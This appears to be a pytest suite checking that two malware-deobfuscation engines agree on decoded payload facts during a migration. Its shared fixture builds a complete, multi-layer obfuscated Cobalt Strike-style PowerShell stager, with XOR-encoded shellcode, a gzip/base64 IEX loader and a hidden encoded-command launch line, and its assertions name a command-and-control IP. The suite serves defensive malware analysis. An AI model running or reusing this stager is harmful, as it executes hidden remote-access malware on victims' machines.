"""Phase A · Migration Equivalence Gate — acceptance tests.

Locks the 4-dimension gate that every Phase-A slice must pass:
    · topology       (ProvenanceGraph.topology_signature())
    · evidence       (order-independent (kind, value) set)
    · recipe         (order-sensitive op sequence, aliased)
    · verdict_inputs (reached_shellcode / iocs / mitre)
"""
from __future__ import annotations

import base64
import gzip

import pytest

from services.uaie import plugins as _p           # noqa: F401
from services.uaie.orchestrator import Orchestrator
from services.uaie.migration_gate import (
    CapabilityFacts, uaie_extract, legacy_extract,
    diff_capability_facts, assert_migration_equivalent,
)


# ── shared fixtures ────────────────────────────────────────────────
def _new_orch() -> Orchestrator:
    return Orchestrator(recognizers=_p.all_recognizers(),
                         max_artifacts=128, max_depth=16)


def _sophos_payload() -> str:
    """The Golden-Vertical-Chain CS stager — reused across slices."""
    xored_b64 = (
        "38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuT"
        "B03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uw"
        "uIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXL"
        "cw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2yyMjIyMS3HR0dHR0Sxl1WoT"
        "c9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4EvFxSyMR46d"
        "xcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0Sdx"
        "wdUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx"
        "0SSRydXNLlHTDKNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3Nz"
        "cDGZ5dEUjSEwodIgEoJKXg6X5qzPHl1iO1buG+VuC6rtpnoH41qg2+GNzdpA"
        "2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1PmpWeplO0fErSN2UEZRDmJERk1"
        "XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFA"
        "DbXcDFQ0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6Y"
        "YoEWg5NP6S9kDRy7v1+9l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZ"
        "ZpMkasn6vGEqpNpUUjihiQnkd4eovJ5UwNNWBtXdWBhJ7ISLKZq6AwYNoC+D"
        "0hbjBx8myxeQl7sj9hecL1KkJuU2mb+lDhPXgV+QPHbyNyxgW2LAdGXKMGjA"
        "wRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+QoYqNMVtUlkoRz/PZlPTWZ+1f"
        "LS6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMzIyNLIyNjI3R"
        "Le4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41b"
        "Ge+DLqt7c3BIXGg0RGw0bEg0SGiMjIyMg")
    layer2 = (
        f"[Byte[]]$var_code = [System.Convert]::FromBase64String("
        f"'{xored_b64}')\n"
        f"for ($x = 0; $x -lt $var_code.Count; $x++) {{"
        f"    $var_code[$x] = $var_code[$x] -bxor 35\n}}\nIEX $DoIt\n"
    )
    gz  = gzip.compress(layer2.encode())
    b64 = base64.b64encode(gz).decode()
    layer1 = (
        f'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('
        f'"{b64}"));IEX (New-Object IO.StreamReader(New-Object '
        f'IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]'
        f'::Decompress))).ReadToEnd();'
    )
    enc = base64.b64encode(layer1.encode("utf-16-le")).decode()
    return (f"%COMSPEC% /b /c start /b /min powershell -nop -w hidden "
            f"-encodedcommand {enc}")


# ══════════════════════════════════════════════════════════════════
# uaie_extract  · shape
# ══════════════════════════════════════════════════════════════════
def test_uaie_extract_returns_capability_facts():
    r  = _new_orch().run(_sophos_payload().encode())
    f  = uaie_extract(r)
    assert isinstance(f, CapabilityFacts)
    assert f.topology is not None
    assert isinstance(f.evidence, set)
    assert isinstance(f.recipe,   tuple)
    assert isinstance(f.verdict_inputs, dict)
    for k in ("reached_shellcode", "iocs", "mitre"):
        assert k in f.verdict_inputs


def test_uaie_extract_is_deterministic():
    p = _sophos_payload().encode()
    a = uaie_extract(_new_orch().run(p))
    b = uaie_extract(_new_orch().run(p))
    assert a.recipe == b.recipe
    assert a.evidence == b.evidence
    assert a.verdict_inputs == b.verdict_inputs
    assert a.topology.topology_signature() == b.topology.topology_signature()


# ══════════════════════════════════════════════════════════════════
# legacy_extract · shape
# ══════════════════════════════════════════════════════════════════
def test_legacy_extract_from_deterministic_best_decode():
    from analysis_core import deterministic_best_decode
    res = deterministic_best_decode(_sophos_payload())
    f   = legacy_extract(res)
    # Topology is intentionally None on the legacy side.
    assert f.topology is None
    # Recipe must be non-empty and canonicalised (no deep-peel- prefix).
    assert f.recipe, "legacy recipe was empty"
    assert not any(op.startswith("deep-peel-") for op in f.recipe), (
        f"canonicalisation failed: {f.recipe}"
    )
    # IOCs land in the evidence set as ipv4 (not "ip").
    ips = {v for k, v in f.evidence if k == "ipv4"}
    assert "149.28.81.19" in ips
    # Verdict inputs shape.
    assert f.verdict_inputs["reached_shellcode"] is True
    assert "149.28.81.19" in f.verdict_inputs["iocs"].get("ipv4", [])


# ══════════════════════════════════════════════════════════════════
# diff_capability_facts · 4-dimension mechanics
# ══════════════════════════════════════════════════════════════════
def test_diff_all_dimensions_match_on_identical_facts():
    r = _new_orch().run(_sophos_payload().encode())
    a = uaie_extract(r)
    b = uaie_extract(r)          # same run → identical facts
    d = diff_capability_facts(a, b)
    for dim in ("topology", "evidence", "recipe", "verdict_inputs"):
        assert d[dim]["match"], f"{dim} unexpectedly differs: {d[dim]}"
    assert d["overall_match"]


def test_diff_detects_missing_evidence():
    r = _new_orch().run(_sophos_payload().encode())
    good = uaie_extract(r)
    stripped = CapabilityFacts(
        topology       = good.topology,
        evidence       = set(),           # <- deliberately empty
        recipe         = good.recipe,
        verdict_inputs = good.verdict_inputs,
    )
    d = diff_capability_facts(good, stripped)
    assert d["evidence"]["match"] is False
    assert d["evidence"]["missing_in_uaie"], (
        "missing_in_uaie should list every stripped evidence tuple"
    )
    assert not d["overall_match"]


def test_diff_detects_recipe_reordering():
    r = _new_orch().run(_sophos_payload().encode())
    good = uaie_extract(r)
    if len(good.recipe) < 2:
        pytest.skip("recipe too short to detect a reorder")
    reordered = CapabilityFacts(
        topology       = good.topology,
        evidence       = good.evidence,
        recipe         = tuple(reversed(good.recipe)),
        verdict_inputs = good.verdict_inputs,
    )
    d = diff_capability_facts(good, reordered)
    assert d["recipe"]["match"] is False, (
        "recipe dimension MUST be order-sensitive"
    )
    assert not d["overall_match"]


def test_diff_detects_verdict_inputs_change():
    r = _new_orch().run(_sophos_payload().encode())
    good = uaie_extract(r)
    flipped_vi = dict(good.verdict_inputs)
    flipped_vi["reached_shellcode"] = not flipped_vi["reached_shellcode"]
    flipped = CapabilityFacts(
        topology       = good.topology,
        evidence       = good.evidence,
        recipe         = good.recipe,
        verdict_inputs = flipped_vi,
    )
    d = diff_capability_facts(good, flipped)
    assert d["verdict_inputs"]["match"] is False
    per = d["verdict_inputs"]["per_key"]
    assert per["reached_shellcode"]["match"] is False


# ══════════════════════════════════════════════════════════════════
# assert_migration_equivalent · fail-loud gate for slice tests
# ══════════════════════════════════════════════════════════════════
def test_assert_migration_equivalent_passes_on_identical_facts():
    r = _new_orch().run(_sophos_payload().encode())
    f = uaie_extract(r)
    # Must NOT raise
    assert_migration_equivalent(f, f)


def test_assert_migration_equivalent_raises_with_named_dimensions():
    r = _new_orch().run(_sophos_payload().encode())
    good = uaie_extract(r)
    bad = CapabilityFacts(
        topology=good.topology, evidence=set(),
        recipe=good.recipe, verdict_inputs=good.verdict_inputs,
    )
    with pytest.raises(AssertionError) as ei:
        assert_migration_equivalent(good, bad, msg="slice-1")
    assert "evidence" in str(ei.value)
    assert "slice-1"  in str(ei.value)


def test_assert_migration_equivalent_dimension_waiver_works():
    """Slices may waive a dimension explicitly (e.g. recipe rename
    in progress).  Waivers must be per-call-site and visible."""
    r = _new_orch().run(_sophos_payload().encode())
    good = uaie_extract(r)
    bad = CapabilityFacts(
        topology=good.topology, evidence=good.evidence,
        recipe=("totally-different",), verdict_inputs=good.verdict_inputs,
    )
    # Recipe waived → passes.  Topology + evidence + verdict_inputs still checked.
    assert_migration_equivalent(good, bad,
        dimensions=("topology", "evidence", "verdict_inputs"))
    # Not waived → fails.
    with pytest.raises(AssertionError):
        assert_migration_equivalent(good, bad)


# ══════════════════════════════════════════════════════════════════
# Cross-engine equivalence · legacy vs UAIE on the Golden payload
# (Slice-0 baseline — proves the harness works before Slice 1 lands)
# ══════════════════════════════════════════════════════════════════
def test_slice0_baseline_legacy_vs_uaie_verdict_inputs_match():
    """Slice-0 · verdict_inputs — the analyst-facing surface.

    Even before any Phase-A migration lands, the deterministic
    engines should already agree on ``reached_shellcode`` and the
    promoted IOC set for the Golden Vertical Chain payload.  If this
    test EVER goes red, an upstream fix (like this session's
    Issue #2 + Issue #3) has silently regressed.
    """
    from analysis_core import deterministic_best_decode
    legacy = legacy_extract(deterministic_best_decode(_sophos_payload()))
    uaie   = uaie_extract(_new_orch().run(_sophos_payload().encode()))
    # reached_shellcode must be True on BOTH engines.
    assert legacy.verdict_inputs["reached_shellcode"] is True
    # C2 IP promoted on the LEGACY side (definitive analyst surface).
    assert "149.28.81.19" in legacy.verdict_inputs["iocs"].get("ipv4", [])
